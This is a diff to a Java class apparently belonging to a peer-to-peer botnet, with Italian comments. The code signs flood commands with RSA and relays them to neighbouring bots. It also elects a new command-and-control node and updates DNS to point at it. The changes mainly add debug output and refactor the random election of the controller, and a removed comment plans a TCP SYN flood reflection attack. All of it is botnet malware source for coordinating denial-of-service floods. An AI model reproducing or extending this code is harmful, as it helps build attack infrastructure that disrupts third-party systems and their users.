@@ -8,7 +8,6 @@ import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Random;
 
@@ -156,15 +155,6 @@ public class Commando {
 		return pServ.getNeighbours(data);
 	}
 
-	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
-
-	// attaca tcp syn flood reflection
-	//
-	// invia comandi ricevuti da pannello al vicinato
-
-	// Differenziare comandi per il singolo ai comandi per la rete(es sleep per
-	// un
-	// bot, attacco per la rete)
 
 	/**
 	 * @param cmd
@@ -184,14 +174,12 @@ public class Commando {
 	public void flooding(String cmd) {
 		String msg = "";
 		String request = "";
+		System.out.println("creo il messaggio per il flood");
 		// aggiungi nonce time.millis
 		Long milli = System.currentTimeMillis();
-
 		Random rand = new SecureRandom(milli.toString().getBytes());
 		Integer nounce = rand.nextInt();
-
 		String hashIdMsg = crypto.generateSha256(nounce.toString());
-
 		String signature = null;
 		try {
 			signature = pki.signMessageRSA(hashIdMsg);
@@ -206,7 +194,6 @@ public class Commando {
 		System.out.println("signature " + signature);
 		System.out.println("msg " + msg);
 		System.out.println("request " + request);
-
 		startFlood(request);
 		return;
 	}
@@ -236,10 +223,13 @@ public class Commando {
 			IP ip = new IP(b.getIp());
 			String pk = b.getPubKey();
 			newKingDns(ip, pk);
+			System.out.println("dns updated..");
+			System.out.println("start first flood");
 			newKingFlood(ip, pk);
 			nServ.getCommandConquerIps().remove(0);
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>( ip, pki.rebuildPuK(pk)));
-			System.out.println("dns updated..");
+		
+			pServ.setNewKing("");
 
 			// TODO DropDATABASE
 			return true;
@@ -251,11 +241,12 @@ public class Commando {
 	 * @param msg
 	 */
 	public void startFlood(String msg) {
+		System.out.println("start flood vicini");
 		for (int i = 0; i < nServ.getNeighbours().getSize(); i++) {
 			Pairs<IP, PublicKey> pairs = nServ.getNeighbours().get(i);
 			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
 		}
-		
+		System.out.println("fine flood");
 //		nServ.getNeighbours().getList().forEach((pairs) -> {
 //			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
 //		});
@@ -281,14 +272,24 @@ public class Commando {
 				byte[] b = s.getBytes();
 				Random rnd = new SecureRandom(b);
 				
-				String ip = ccList.get((int) Math.ceil(rnd.nextDouble() * (ccList.size() - 1)));
+
+				Double d =rnd.nextDouble();
+				Integer size = (ccList.size() - 1);
+				int rand = (int) Math.ceil(d * size);
+				String ip = ccList.get(rand);
+				ccList.forEach((botIp )->System.out.println("bot Ip per sorteggio"+ botIp));
+				System.out.println("byte seed "+ b.toString());
+				System.out.println(" next double "+ d);
+				System.out.println("size "+size);
+				System.out.println("rand "+ rand);
+				System.out.println("byte seed "+ b.toString());
 				System.out.println("ho eletto " + ip);
 				if (ccReq.becameCc(ip)) {
 					pServ.setNewKing( bServ.searchBotIP(ip).getIdBot());
 				}
-				System.out.println("erection completed ");
+				System.out.println("erection completed strating transfer ");
 			} else
-				System.out.println("nessuno da ereggere");
+				System.out.println("nessuno da eleggere");
 			// elegilo passa i dati
 			// passa il potere
 		}
